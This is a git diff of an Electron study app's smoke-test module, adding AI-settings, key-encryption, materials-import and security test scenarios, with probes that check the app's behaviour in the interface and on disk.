@@ -1,4 +1,5 @@
 import { BrowserWindow, app } from 'electron'
+import { execSync } from 'node:child_process'
 import {
   appendFileSync,
   existsSync,
@@ -17,8 +18,17 @@ import { EXPORT_EXTENSIONS } from '@shared/limits'
 import type { ExportFormat } from '@shared/types'
 
 import { context } from './context'
-import { ensureDir, setUserDataOverride, tempDir } from './paths'
+import {
+  cardsFile,
+  ensureDir,
+  materialsDir,
+  secretsFile,
+  setUserDataOverride,
+  tempDir
+} from './paths'
+import { resolveNotesDir } from './services/settings'
 import { encodePng } from './services/png'
+import { SecretsStore } from './services/secrets'
 
 /**
  * 冒烟 / 端到端自检。
@@ -43,6 +53,8 @@ import { encodePng } from './services/png'
  *              自己写盘会不会造成事件回环、外部改动撞上未保存内容时会不会先问一句
  *  - export    额外验证笔记导出：导出菜单挂得上、md / html / docx / pdf
  *              四种产物都能落到磁盘，而且**内容对得上**
+ *  - ai        额外验证 AI 助手与密钥存储：没配密钥时拦在出网之前、
+ *              服务商预设联动、本地模型不要求密钥、密钥以密文落盘且能解回
  *
  * 门户场景**不测图标抓取**：那需要真实网络，在无网的 CI 里会让自检变成随机失败。
  * 图标文件由本文件直接造好写进图标目录，测的是「图标能不能显示出来」这条链路，
@@ -57,7 +69,17 @@ import { encodePng } from './services/png'
  * 主进程会走的那条写入路径，同时让「产物到底对不对」可以被硬断言。
  */
 
-export type SmokeScenario = 'basic' | 'timetable' | 'portal' | 'cards' | 'notes' | 'sync' | 'export'
+export type SmokeScenario =
+  | 'basic'
+  | 'timetable'
+  | 'portal'
+  | 'cards'
+  | 'notes'
+  | 'sync'
+  | 'export'
+  | 'ai'
+  | 'security'
+  | 'materials'
 
 export function smokeEnabled(): boolean {
   return process.env['STUDY_BOARD_SMOKE'] === '1'
@@ -71,6 +93,9 @@ export function smokeScenario(): SmokeScenario {
   if (value === 'notes') return 'notes'
   if (value === 'sync') return 'sync'
   if (value === 'export') return 'export'
+  if (value === 'ai') return 'ai'
+  if (value === 'security') return 'security'
+  if (value === 'materials') return 'materials'
   return 'basic'
 }
 
@@ -86,6 +111,13 @@ export function prepareIsolatedDataDir(): void {
     app.setPath('userData', dir)
   } catch {
     /* 个别平台不允许覆盖，忽略即可——我们自己的数据已经隔离了 */
+  }
+  // 下载目录一并隔离：资料收件箱默认在「下载目录/StudyBoard收件箱」，
+  // 不改的话自动化测试会往用户真实的下载目录里塞文件、弹导入框
+  try {
+    app.setPath('downloads', join(dir, 'downloads'))
+  } catch {
+    /* 同上，忽略 */
   }
   console.info(`[自动化] 使用临时数据目录：${dir}`)
 }
@@ -229,6 +261,113 @@ function seedCards(): void {
 }
 
 /**
+ * 安全场景的靶子数据。
+ *
+ * 与其它 seed 不同，这里种的东西**就是给攻击用的**：
+ *  - 一张真实 PNG 走 addImages 导入：协议穿越测试需要「越桶读到一个真实存在的文件」，
+ *    拿 404 当结果区分不出「被挡了」和「文件本来就不存在」。
+ *    必须走导入而不是直接 writeFileSync——后者不在课表索引里，
+ *    会被 sweepOrphanFiles 当无主文件清掉（测试对象被自己的垃圾回收删了，还测什么）
+ *  - 一篇笔记：给重命名注入、导出路径攻击当靶子
+ */
+async function seedSecurity(): Promise<void> {
+  const { timetable, notes } = context()
+  const png = makeTestPng(24, 24)
+  const scratch = join(mkdtempSync(join(tmpdir(), 'sb-seed-')), 'security-probe.png')
+  writeFileSync(scratch, png)
+  const result = await timetable.addImages([scratch])
+  rmSync(dirname(scratch), { recursive: true, force: true })
+  if (result.added !== 1) {
+    console.error('[smoke] 安全场景的课表图片没种上：', JSON.stringify(result.errors))
+  }
+  notes.create('安全探针')
+}
+
+/**
+ * 资料场景的靶子：一张卡片（归属目标）+ 三个待导入的文件。
+ *
+ * 文件都造在 tempDir 下而不是随便找系统文件——导入会**复制**它们，
+ * 用真实系统文件等于偷偷拷贝用户的东西。
+ * 「伪装.pdf」内容是文本、扩展名是 pdf：魔数闸口的靶子，它必须被拒收。
+ */
+async function seedMaterials(): Promise<void> {
+  const { cards } = context()
+  cards.upsert({ courseName: '高等数学 A', teacher: '张启明' })
+
+  const dir = ensureDir(join(tempDir(context().settings.get().portableMode), 'material-src'))
+  const pdf = '%PDF-1.4\n1 0 obj\n<< /Type /Catalog >>\nendobj\ntrailer\n<< >>\n%%EOF\n'
+  writeFileSync(join(dir, '第3章极限.pdf'), pdf, 'binary')
+  // PPTX 本质是 zip：PK 头 + 随便一点内容，够过魔数闸就行
+  const pptx = Buffer.concat([
+    Buffer.from([0x50, 0x4b, 0x03, 0x04]),
+    Buffer.from('1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20', 'utf-8')
+  ])
+  writeFileSync(join(dir, 'week1.pptx'), pptx)
+  writeFileSync(join(dir, '伪装.pdf'), '这不是一个 PDF，只是名字像。', 'utf-8')
+
+  // 收件箱的靶子：模拟「浏览器扩展改存进来的下载」
+  const inbox = ensureDir(
+    join(app.getPath('downloads'), 'StudyBoard收件箱')
+  )
+  writeFileSync(join(inbox, '教学大纲.pdf'), pdf, 'binary')
+}
+
+/**
+ * 界面上要用的源文件路径。seed 写到固定目录，探针从这里拿。
+ */
+function materialSourcePaths(): string[] {
+  const dir = join(tempDir(context().settings.get().portableMode), 'material-src')
+  return [join(dir, '第3章极限.pdf'), join(dir, 'week1.pptx'), join(dir, '伪装.pdf')]
+}
+
+/**
+ * 「界面上看得见」不算数：去磁盘上把 attachments/ 翻出来对一遍。
+ *
+ * 验三件事：文件真的复制进了库（不是只登记了索引）、
+ * 改名后磁盘上的旧名字没了新名字在、伪装文件从来没进过库。
+ */
+function verifyMaterialsOnDisk(): boolean {
+  const dir = materialsDir(resolveNotesDir(context().settings.get()))
+  let files: string[] = []
+  try {
+    files = readdirSync(dir).filter((name) => !name.startsWith('.'))
+  } catch (error) {
+    console.error('[smoke] 读不了资料目录：', error)
+    return false
+  }
+  console.info(`[smoke] 资料库文件：${files.join(' / ') || '（空）'}`)
+
+  const mustHave = '高等数学 A_函数与极限.pdf'
+  if (!files.includes(mustHave)) {
+    console.error('[smoke] 改名后的文件不在资料库里')
+    return false
+  }
+  if (files.some((name) => name.indexOf('第3章') >= 0 || name.indexOf('week1') >= 0)) {
+    console.error('[smoke] 删除 / 改名前的文件还留在库里')
+    return false
+  }
+  if (files.some((name) => name.indexOf('伪装') >= 0)) {
+    console.error('[smoke] 伪装文件混进了资料库')
+    return false
+  }
+
+  try {
+    const raw = JSON.parse(readFileSync(join(dir, '.materials.json'), 'utf-8')) as {
+      items?: { fileName?: string }[]
+    }
+    const names = (raw.items ?? []).map((item) => item.fileName ?? '')
+    if (!names.includes(mustHave) || !names.includes('高等数学 A_教学大纲.pdf')) {
+      console.error('[smoke] 索引与磁盘对不上：', JSON.stringify(names))
+      return false
+    }
+    return true
+  } catch (error) {
+    console.error('[smoke] 读不了资料索引：', error)
+    return false
+  }
+}
+
+/**
  * 笔记编辑器测试数据。
  *
  * 内容是刻意挑的：标题、加粗、行内代码、列表各来一个——
@@ -367,15 +506,41 @@ const PROBE_HELPERS = `
       await wait(100)
     }
   }
+  // 等一段文字**离开占位值**。占位文案（"加载中…"）是随页面一起渲染的，
+  // 所以"元素在"等于什么都没有等到——要等的是它被真实数据换掉
+  const waitForTextChange = async (selector, placeholder, timeout = 15000) => {
+    const deadline = Date.now() + timeout
+    for (;;) {
+      const el = document.querySelector(selector)
+      const text = el ? el.textContent.trim() : ''
+      if (text.length > 0 && text !== placeholder) return text
+      if (Date.now() > deadline) return text
+      await wait(100)
+    }
+  }
 `
 
 const BASIC_PROBE = `(async () => {
   ${PROBE_HELPERS}
   const shell = await waitFor('study-board-app .sb-shell')
+
+  // 侧栏那行版本号不能把 process.platform 直接摆出来：
+  // win32 在 64 位 Windows 上也是 win32，用户会读成「这是 32 位的软件」。
+  // 它必须说人话（Windows / macOS / Linux）并且带上位数。
+  // 注意这里要等它被数据换掉，不能等元素出现——占位文案是随页面一起画出来的
+  const versionText = await waitForTextChange('[data-role="version"]', '加载中…', 10000)
+  const rawTokenShown =
+    versionText.includes('win32') || versionText.includes('darwin') || versionText.includes('linux')
+  const hasOsName =
+    versionText.includes('Windows') || versionText.includes('macOS') || versionText.includes('Linux')
+  const hasBits = versionText.includes('位') || versionText.includes('ARM')
+
   return JSON.stringify({
     customElement: Boolean(document.querySelector('study-board-app')),
     mounted: Boolean(shell),
-    bridge: typeof window.studyBoard === 'object'
+    bridge: typeof window.studyBoard === 'object',
+    versionText,
+    versionLabelOk: Boolean(versionText && !rawTokenShown && hasOsName && hasBits)
   })
 })()`
 
@@ -930,6 +1095,91 @@ const CARDS_PROBE = `(async () => {
   const jumpedTitle = document.querySelector('[data-role="title"]').value
   const jumpOk = jumpedTitle === expectedTitle
 
+  // —— 三态：在学 / 想学、归档、已学库
+  //
+  // 这一路是四个真实的用户动作：改主意（挪进愿望单）、学完了（归档）、
+  // 翻旧账（去已学库）、又想接着修（移回在学）。每一步都同时验「界面上数字变了」
+  // 和「卡片真的换了地方」——只验按钮点得动等于没验。
+  document.querySelector('[data-route="study"]').click()
+  const backInTime = await waitForCount('.sb-itemcard', 4)
+  if (!backInTime) return JSON.stringify({ error: '回到课程页后卡片没渲染出来' })
+
+  const tabs = document.querySelectorAll('.sb-switch__item')
+  const learningCount = document.querySelector('[data-count="learning"]')
+  const wishCount = document.querySelector('[data-count="wish"]')
+  const learningSelected = document
+    .querySelector('[data-tab="learning"]')
+    .getAttribute('aria-selected')
+  const switchOk = Boolean(
+    tabs.length === 2 &&
+      learningSelected === 'true' &&
+      learningCount &&
+      learningCount.textContent.trim() === '4' &&
+      wishCount &&
+      wishCount.textContent.trim() === '0'
+  )
+
+  // 想学页签空着的时候，得说得出来自己是什么，而不是一个光秃秃的白框
+  document.querySelector('[data-tab="wish"]').click()
+  await wait(150)
+  const wishTabEmpty = document.querySelectorAll('.sb-itemcard').length === 0
+  const emptyEl = document.querySelector('.sb-cards > .sb-empty')
+  const emptyHintOk = Boolean(emptyEl) && !emptyEl.hidden && emptyEl.textContent.includes('愿望单')
+
+  document.querySelector('[data-tab="learning"]').click()
+  const returnedToLearning = await waitForCount('.sb-itemcard', 4)
+
+  // 把最后一张挪进愿望单：正面该换成「想修的理由 + 计划学期」，
+  // 而不是照搬在学卡片、显示一排「未填」
+  const lastCard = document.querySelectorAll('.sb-itemcard')[3]
+  const wishButton = lastCard.querySelector('[data-act="status"][data-to="wish"]')
+  if (wishButton) wishButton.click()
+  const wishMoved = await waitForCount('.sb-itemcard', 3)
+  document.querySelector('[data-tab="wish"]').click()
+  const wishShown = await waitForCount('.sb-itemcard', 1)
+  const wishFrontText = document.querySelector('.sb-itemcard__face--front').textContent
+  const wishFrontOk = wishFrontText.includes('想修的理由') && wishFrontText.includes('计划')
+  const wishCountNow = document.querySelector('[data-count="wish"]').textContent.trim()
+
+  document.querySelector('[data-tab="learning"]').click()
+  await waitForCount('.sb-itemcard', 3)
+
+  // 归档一张：在学少一个，已学多一个
+  const archiveButton = document.querySelector('.sb-itemcard [data-act="status"][data-to="learned"]')
+  if (archiveButton) archiveButton.click()
+  const archivedInTime = await waitForCount('.sb-itemcard', 2)
+  const metaAfterArchive = document.querySelector('[data-role="meta"]').textContent
+  const archiveOk = archivedInTime && metaAfterArchive.includes('已学 1')
+
+  // 已学库：卡片该按学期分组摆着，而不是堆成一坨
+  document.querySelector('[data-route="archived"]').click()
+  const inArchive = await waitForCount('.sb-itemcard', 1)
+  const groupTitle = document.querySelector('.sb-cards__group-title')
+  const groupText = groupTitle ? groupTitle.textContent.trim() : ''
+  // 归档会给没填学期的卡片补一个默认学期，所以这里不该出现「未填学期」。
+  // 用 indexOf 而不是正则：探针整段是模板字符串，正则里的转义会被吃掉（老坑）
+  const groupOk = Boolean(
+    inArchive && groupText.length > 0 && groupText.indexOf('-') > 0 && groupText !== '未填学期'
+  )
+
+  // 移回在学：已学库要立刻空掉，并且说清楚为什么空
+  const restoreButton = document.querySelector('.sb-itemcard [data-act="status"][data-to="learning"]')
+  if (restoreButton) restoreButton.click()
+  const archiveEmptied = await waitForCount('.sb-itemcard', 0)
+  const archiveEmptyEl = document.querySelector('.sb-cards > .sb-empty')
+  const restoreOk = Boolean(
+    archiveEmptied && archiveEmptyEl && !archiveEmptyEl.hidden && archiveEmptyEl.textContent.includes('已学库')
+  )
+
+  // 再归档一次收尾：磁盘校验要求最后真有「已学」和「想学」两种状态落着
+  document.querySelector('[data-route="study"]').click()
+  await waitForCount('.sb-itemcard', 3)
+  const archiveAgain = document.querySelector('.sb-itemcard [data-act="status"][data-to="learned"]')
+  if (archiveAgain) archiveAgain.click()
+  await waitForCount('.sb-itemcard', 2)
+  document.querySelector('[data-route="archived"]').click()
+  await waitForCount('.sb-itemcard', 1)
+
   return JSON.stringify({
     flipped, flippedBack, backText, frontOk, options, pickerOk,
     carriedName, carriedTeacher, carriedOk, addedInTime, addedText,
@@ -937,9 +1187,16 @@ const CARDS_PROBE = `(async () => {
     nameFont, teacherFont, bodyFont, scoreFont, gapBeforeRule, faceOverflow, typoOk,
     cardW: Math.round(cardRect.width), cardH: Math.round(cardRect.height),
     longNameLines, longOverflow, longNameOk, accentText, badgeColor, contrastOk,
+    switchOk, wishTabEmpty, emptyHintOk, returnedToLearning, wishMoved, wishShown,
+    wishFrontOk, wishCountNow, archivedInTime, archiveOk, inArchive, groupText, groupOk,
+    archiveEmptied, restoreOk,
     flipOk: flipped && flippedBack && backText > 0,
     addOk: pickerOk && carriedOk && addedInTime && addedText,
-    noteOk: listItems && autoNoteOk && typedOk
+    noteOk: listItems && autoNoteOk && typedOk,
+    statusOk:
+      switchOk && wishTabEmpty && emptyHintOk && returnedToLearning &&
+      wishMoved && wishShown && wishFrontOk && wishCountNow === '1' && archiveOk,
+    archivedOk: inArchive && groupOk && archiveEmptied && restoreOk
   })
 })()`
 
@@ -1064,7 +1321,13 @@ export function runSmokeTestIfRequested(win: BrowserWindow): void {
             ? NOTES_PROBE
             : scenario === 'export'
               ? exportProbe(exportDir)
-              : BASIC_PROBE
+              : scenario === 'ai'
+                ? aiProbe()
+              : scenario === 'security'
+                ? SECURITY_PROBE
+                : scenario === 'materials'
+                  ? materialsProbe()
+                  : BASIC_PROBE
   // sync 要在主进程与渲染层之间来回走好几趟；export 要跑一次 Packer
   // 再起一个隐藏窗口打印 PDF，都比纯界面自检慢得多
   const timeoutMs =
@@ -1074,7 +1337,11 @@ export function runSmokeTestIfRequested(win: BrowserWindow): void {
         ? 70_000
         : scenario === 'export'
           ? 60_000
-          : 35_000
+          : scenario === 'security'
+            ? 60_000
+            : scenario === 'materials'
+              ? 45_000
+              : 35_000
 
   const timer = setTimeout(() => {
     console.error(`[smoke] 超时：渲染层 ${timeoutMs / 1000} 秒内未完成自检`)
@@ -1170,8 +1437,12 @@ export function runSmokeTestIfRequested(win: BrowserWindow): void {
                         parsed['addOk'] &&
                         parsed['noteOk'] &&
                         parsed['jumpOk'] &&
+                        // 三态：在学 / 想学切换、归档、已学库分组、移回在学
+                        parsed['statusOk'] &&
+                        parsed['archivedOk'] &&
                         // 界面说自己存了不算数，磁盘上真有一份对得上的文件才算
-                        verifyNoteOnDisk()
+                        verifyNoteOnDisk() &&
+                        verifyCardStatusOnDisk()
                     )
                   : scenario === 'export'
                   ? Boolean(
@@ -1180,7 +1451,76 @@ export function runSmokeTestIfRequested(win: BrowserWindow): void {
                         // 对得上内容才算
                         verifyExportOutputs(parsed['results'])
                     )
-                  : Boolean(parsed['customElement'] && parsed['mounted'] && parsed['bridge'])
+                  : scenario === 'ai'
+                  ? Boolean(
+                      parsed['gateOk'] &&
+                        parsed['providerOk'] &&
+                        parsed['presetSwitchOk'] &&
+                        parsed['keyFieldHiddenOk'] &&
+                        parsed['localStateOk'] &&
+                        parsed['noKeyBlocked'] &&
+                        parsed['chipsOk'] &&
+                        parsed['modalOk'] &&
+                        parsed['openedWithoutKey'] &&
+                        parsed['presetOk'] &&
+                        parsed['modalClosed'] &&
+                        // 「平台」那一行必须说人话：不能是 win32 / darwin 这种机器记号
+                        parsed['aboutOk'] &&
+                        // 没有系统钥匙串时（部分 Linux）不做落盘检查，
+                        // 那条路要求的是「拒绝保存」而不是「写下明文」
+                        (parsed['keyringUnavailable']
+                          ? parsed['refusalOk']
+                          : parsed['saveOk'] &&
+                            parsed['clearOk'] &&
+                            parsed['restored'] &&
+                            verifySecretsOnDisk())
+                    )
+                  : scenario === 'security'
+                  ? Boolean(
+                      // 渲染层主探针：逃逸、暴露面、XSP 执行面、网络面、协议穿越、fuzz
+                      parsed['escapeOk'] &&
+                        parsed['preloadOk'] &&
+                        parsed['xssBlocked'] &&
+                        parsed['networkBlocked'] &&
+                        parsed['assetEscapeOk'] &&
+                        parsed['fuzzSurvived'] &&
+                        parsed['fuzzMustReject'] &&
+                        parsed['protoClean'] &&
+                        parsed['renameRoundTripOk'] &&
+                        parsed['windowOpenOk']
+                    )
+                  : scenario === 'materials'
+                  ? Boolean(
+                      parsed['ok'] === true &&
+                        // 界面说自己存了不算数，磁盘上真有一份对得上的文件才算
+                        verifyMaterialsOnDisk()
+                    )
+                  : Boolean(
+                      parsed['customElement'] &&
+                        parsed['mounted'] &&
+                        parsed['bridge'] &&
+                        parsed['versionLabelOk']
+                    )
+
+        // 安全场景还有两笔账要在退出前结掉：
+        //  - 导航劫持单独跑一趟（成功的话那一趟自己就死了，没法并进主探针）
+        //  - 主进程到底有没有监听端口（渲染层自己看不出来）
+        let finalPassed = passed
+        if (scenario === 'security') {
+          const hijackRaw = await win.webContents
+            .executeJavaScript(SECURITY_HIJACK_PROBE, true)
+            .catch(() => null)
+          const hijack = hijackRaw
+            ? (JSON.parse(String(hijackRaw)) as { hijacked?: boolean; after?: string })
+            : // 探针没能跑完本身就说明页面被跳走了
+              { hijacked: true }
+          console.info('[smoke] 导航劫持探针：', JSON.stringify(hijack))
+          if (hijack.hijacked) {
+            console.error('[smoke] 渲染层把窗口导航到了外部地址：', hijack.after)
+          }
+          const noListeners = verifyNoListeningPorts()
+          finalPassed = passed && !hijack.hijacked && noListeners
+        }
 
         if (scenario === 'timetable') {
           // 自检结束时停在图片模式，先留一张图；再切回表格模式，留第二张
@@ -1202,7 +1542,9 @@ export function runSmokeTestIfRequested(win: BrowserWindow): void {
           // 自检收尾停在概览页（正好能同时看到首页的门户格子）
           await captureIfRequested(win, 'portal-home.png')
         } else if (scenario === 'cards') {
-          // 收尾停在「课程与学习」页，留一张带卡片的截图
+          // 收尾先停在「课程与学习」页（留一张带卡片和状态切换器的截图），
+          // 再去已学库留一张分组视图——三态是这个场景新加的东西，
+          // 光看文字断言看不出分组到底排得对不对
           await win.webContents
             .executeJavaScript(
               `(async () => {
@@ -1215,17 +1557,79 @@ export function runSmokeTestIfRequested(win: BrowserWindow): void {
             )
             .catch(() => undefined)
           await captureIfRequested(win, 'cards.png')
+
+          await win.webContents
+            .executeJavaScript(
+              `(async () => {
+                 const wait = (ms) => new Promise((r) => setTimeout(r, ms))
+                 document.querySelector('[data-route="archived"]')?.click()
+                 await wait(900)
+                 return 'ok'
+               })()`,
+              true
+            )
+            .catch(() => undefined)
+          await captureIfRequested(win, 'cards-archived.png')
+
+          // 再回概览页：那里原来写着「课程卡片 —— 开发中」，现在是一句三态统计，
+          // 截图留一份，省得以后再出现「功能做完了、首页还写着开发中」
+          await win.webContents
+            .executeJavaScript(
+              `(async () => {
+                 const wait = (ms) => new Promise((r) => setTimeout(r, ms))
+                 document.querySelector('[data-route="home"]')?.click()
+                 await wait(900)
+                 return 'ok'
+               })()`,
+              true
+            )
+            .catch(() => undefined)
+          await captureIfRequested(win, 'cards-home.png')
         } else if (scenario === 'notes') {
           // 收尾停在 Markdown 模式，留一张带编辑器与工具栏的截图
           await captureIfRequested(win, 'notes.png')
         } else if (scenario === 'export') {
           // 收尾时导出菜单是开着的，截图里能同时看到编辑器与菜单
           await captureIfRequested(win, 'export.png')
+        } else if (scenario === 'ai') {
+          // 收尾停在设置页的 AI 区块：滚过去再截，不然截图里只看得到上半页
+          await win.webContents
+            .executeJavaScript(
+              `(async () => {
+                 const wait = (ms) => new Promise((r) => setTimeout(r, ms))
+                 document.querySelector('[data-route="settings"]')?.click()
+                 await wait(600)
+                 const anchor = document.querySelector('#set-ai-provider')
+                 if (anchor) anchor.scrollIntoView({ block: 'center' })
+                 await wait(400)
+                 return 'ok'
+               })()`,
+              true
+            )
+            .catch(() => undefined)
+          await captureIfRequested(win, 'ai.png')
+        } else if (scenario === 'security') {
+          // 安全场景收尾停在概览页，截图里能看到「页面本身没被攻击搞坏」
+          await captureIfRequested(win, 'security.png')
+        } else if (scenario === 'materials') {
+          // 收尾停在资料页，截图里能看到按课程分组的列表
+          await win.webContents
+            .executeJavaScript(
+              `(async () => {
+                 const wait = (ms) => new Promise((r) => setTimeout(r, ms))
+                 document.querySelector('[data-route="materials"]')?.click()
+                 await wait(900)
+                 return 'ok'
+               })()`,
+              true
+            )
+            .catch(() => undefined)
+          await captureIfRequested(win, 'materials.png')
         } else {
           await captureIfRequested(win, 'screenshot.png')
         }
 
-        setTimeout(() => app.exit(passed ? 0 : 1), 200)
+        setTimeout(() => app.exit(finalPassed ? 0 : 1), 200)
       })
       .catch((error: unknown) => {
         clearTimeout(timer)
@@ -1247,6 +1651,9 @@ export async function prepareSmokeDataIfRequested(): Promise<void> {
   else if (scenario === 'notes') seedNotes()
   else if (scenario === 'sync') seedNotes()
   else if (scenario === 'export') seedExport()
+  else if (scenario === 'ai') seedAi()
+  else if (scenario === 'security') await seedSecurity()
+  else if (scenario === 'materials') await seedMaterials()
 }
 
 /**
@@ -1290,6 +1697,75 @@ function verifyNoteOnDisk(): boolean {
   }
 
   return verifyExternalNote()
+}
+
+/**
+ * 主进程有没有监听任何 TCP 端口。
+ *
+ * 「绝不把端口暴露到公网」是硬约束——渲染层自己看不见这件事，
+ * 只有主进程侧跑 netstat 才能给出硬证据。Windows 用 netstat -ano 按 PID 过滤；
+ * 非 Windows 平台上 netstat 参数不同，catch 到就跳过（CI 只打 Win/mac 安装包，
+ * 这条在 win 上是硬断言）。
+ */
+function verifyNoListeningPorts(): boolean {
+  if (process.platform !== 'win32') {
+    console.info('[smoke] 端口监听检查目前只在 Windows 上硬断言，本平台跳过')
+    return true
+  }
+  try {
+    const out = execSync('netstat -ano', { encoding: 'utf-8', timeout: 15000 })
+    const pid = String(process.pid)
+    const listeners = out
+      .split('\n')
+      .filter((line) => line.includes('LISTENING') && line.trimEnd().endsWith(pid))
+    if (listeners.length > 0) {
+      console.error('[smoke] 主进程在监听端口：', JSON.stringify(listeners))
+      return false
+    }
+    console.info('[smoke] netstat 确认主进程没有任何监听端口')
+    return true
+  } catch (error) {
+    console.error('[smoke] netstat 跑不起来，无法确认：', error)
+    return false
+  }
+}
+
+/**
+ * 卡片的三态有没有真的落盘。
+ *
+ * 「已学库里看得见这张卡片」只证明主进程**内存**里它是 `learned`——
+ * `CardsStore.list()` 读的是内存里那份，重启就没了。这一条直接去读 cards.json，
+ * 确认 status 与自动补的 semester 两个字段真的写进了文件。
+ *
+ * 顺便盯住一个容易退化的点：归档时该给没填学期的卡片补一个默认学期。
+ * 少了这一步，已学库会整片堆在「未填学期」那一组里，等于白分组。
+ */
+function verifyCardStatusOnDisk(): boolean {
+  const file = cardsFile(context().settings.get().portableMode)
+  try {
+    const raw = JSON.parse(readFileSync(file, 'utf-8')) as {
+      cards?: { status?: string; semester?: string }[]
+    }
+    const list = Array.isArray(raw.cards) ? raw.cards : []
+    const learned = list.filter((card) => card.status === 'learned')
+    const wish = list.filter((card) => card.status === 'wish')
+    console.info(
+      `[smoke] 卡片状态落盘：共 ${list.length} 张 · 已学 ${learned.length} · 想学 ${wish.length}`
+    )
+    if (learned.length === 0 || wish.length === 0) {
+      console.error('[smoke] cards.json 里没同时存在「已学」和「想学」的卡片')
+      return false
+    }
+    const missingSemester = [...learned, ...wish].filter((card) => (card.semester ?? '').length === 0)
+    if (missingSemester.length > 0) {
+      console.error('[smoke] 有卡片没能自动补上学期：', JSON.stringify(missingSemester))
+      return false
+    }
+    return true
+  } catch (error) {
+    console.error('[smoke] 读不了卡片文件：', error)
+    return false
+  }
 }
 
 /**
@@ -1483,6 +1959,643 @@ function verifyExportOutputs(raw: unknown): boolean {
 
   if (ok) console.info('[smoke] 四种导出产物都在磁盘上，且内容对得上')
   return ok
+}
+
+/* ------------------------------------------------------- AI 助手与密钥 */
+
+const AI_SEED_TITLE = 'AI 自检'
+const AI_SEED_BODY = [
+  '# 光合作用',
+  '',
+  '植物把光能变成化学能，储存在有机物里。',
+  '',
+  '## 要点',
+  '',
+  '- 场所：叶绿体',
+  '- 原料：二氧化碳和水',
+  '- 产物：有机物和氧气',
+  ''
+].join('\n')
+
+/** 一个一眼就能认出来的假密钥：等下要在文件里按字节搜它 */
+const AI_SMOKE_KEY = 'sk-smoke-3f9c1d7a-not-a-real-key'
+
+function seedAi(): void {
+  context().notes.create(AI_SEED_TITLE, AI_SEED_BODY)
+}
+
+/**
+ * 密钥落盘检查：**去磁盘上看，不看接口说了什么**。
+ *
+ * 两件事必须同时成立，「密钥不是明文存的」这句话才站得住：
+ *  1. `secrets.bin` 里按字节搜不到明文——绕过任何序列化层，直接搜文件；
+ *  2. 重新打开这个文件能**解回原值**——加密了但解不回来，等于把密钥弄丢了。
+ *     这一条也顺带证明了 DPAPI / Keychain 那一段真的跑通了，
+ *     而不只是「写了个东西进去」。
+ */
+function verifySecretsOnDisk(): boolean {
+  const portable = context().settings.get().portableMode
+  const file = secretsFile(portable)
+
+  if (!existsSync(file)) {
+    console.error('[smoke] secrets.bin 不存在，密钥根本没落盘')
+    return false
+  }
+
+  if (readFileSync(file, 'utf-8').includes(AI_SMOKE_KEY)) {
+    console.error('[smoke] secrets.bin 里能搜到明文密钥')
+    return false
+  }
+
+  if (new SecretsStore(portable).get('aiKey') !== AI_SMOKE_KEY) {
+    console.error('[smoke] 密钥解不回来，加密之后就丢了')
+    return false
+  }
+
+  console.info('[smoke] 密钥以密文落在 secrets.bin，且能原样解回')
+  return true
+}
+
+/**
+ * AI 场景的渲染层自检。
+ *
+ * **不发真实请求**：那需要网络和一个能用的密钥，在 CI 里只会变成随机失败。
+ * 这一趟测的是「发不出去的那些情况」——没配密钥时该拦在出网之前、
+ * 本地模型不该被要求填密钥、对话框该出现、结果该先预览再落进正文。
+ * 「连接能不能通」由设置页的「测试连接」按钮负责，那是人点一下的事。
+ */
+function aiProbe(): string {
+  return `(async () => {
+  ${PROBE_HELPERS}
+  const KEY = ${JSON.stringify(AI_SMOKE_KEY)}
+  const TITLE = ${JSON.stringify(AI_SEED_TITLE)}
+  const out = {}
+  const visible = (el) => Boolean(el) && el.getClientRects().length > 0
+  const setValue = (selector, value) => {
+    const el = document.querySelector(selector)
+    if (!el) return false
+    el.value = value
+    el.dispatchEvent(new Event('change', { bubbles: true }))
+    return true
+  }
+
+  /* ---- 1. 没配密钥就点 AI 助手：应该先弹「去设置」，而不是把请求发出去 */
+  const nav = await waitFor('[data-route="notes"]')
+  if (!nav) return JSON.stringify({ error: '导航未就绪' })
+  nav.click()
+
+  const listed = await window.studyBoard.notes.list()
+  const note = listed.ok ? listed.data.find((n) => n.title === TITLE) : null
+  if (!note) return JSON.stringify({ error: '列表里找不到「AI 自检」那篇笔记' })
+
+  const item = await waitFor('[data-role="list"] [data-note="' + note.id + '"]')
+  if (!item) return JSON.stringify({ error: '笔记列表里没有那一篇' })
+  item.click()
+  // 等编辑器真的挂上，别在 open() 还没走完时就点 AI
+  await waitFor('[data-role="stage"] .cm-editor', 8000)
+
+  const aiButton = await waitFor('[data-action="ai"]')
+  if (!aiButton) return JSON.stringify({ error: '找不到 AI 助手按钮' })
+  aiButton.click()
+
+  const gate = await waitFor('.sb-modal__card [data-role="confirm"]', 6000)
+  out.gateOk = Boolean(gate) && document.body.textContent.indexOf('还没配置 AI 服务') >= 0
+  if (!gate) return JSON.stringify(out)
+  gate.click()
+
+  /* ---- 2. 设置页：服务商清单与联动 */
+  const provider = await waitFor('#set-ai-provider', 8000)
+  if (!provider) return JSON.stringify({ error: '点「去设置」之后设置页没打开' })
+
+  const options = Array.prototype.map.call(provider.options, (o) => o.value)
+  out.providerCount = options.length
+  out.hasCustom = options.indexOf('custom') >= 0
+  out.defaultProvider = provider.value
+  out.providerOk = options.length === 9 && out.hasCustom && provider.value === 'deepseek'
+
+  // 选中某个预设 = 接受它那一套默认值：地址和模型都该跟着换
+  setValue('#set-ai-provider', 'zhipu')
+  await waitForValue('#set-ai-base', 'https://open.bigmodel.cn/api/paas/v4', 6000)
+  await waitForValue('#set-ai-model', 'glm-4-flash', 6000)
+  out.presetSwitchOk =
+    (document.querySelector('#set-ai-base') || {}).value === 'https://open.bigmodel.cn/api/paas/v4' &&
+    (document.querySelector('#set-ai-model') || {}).value === 'glm-4-flash' &&
+    visible(document.querySelector('[data-role="ai-key-field"]'))
+
+  /* ---- 3. 切到本地模型：本机地址不校验密钥，那一栏该收起来 */
+  setValue('#set-ai-provider', 'ollama')
+  await waitForValue('#set-ai-base', 'http://127.0.0.1:11434/v1', 6000)
+  out.localBase = (document.querySelector('#set-ai-base') || {}).value
+  out.keyFieldHiddenOk = !visible(document.querySelector('[data-role="ai-key-field"]'))
+  out.localStateOk = await waitForText('[data-role="ai-state"]', '不需要密钥', 6000)
+
+  /* ---- 4. 换回远端服务商（此时仍然没有密钥）：请求必须拦在出网之前 */
+  setValue('#set-ai-provider', 'zhipu')
+  await waitForValue('#set-ai-base', 'https://open.bigmodel.cn/api/paas/v4', 6000)
+  const blocked = await window.studyBoard.ai.complete({ instruction: '整理一下', context: '一段内容' })
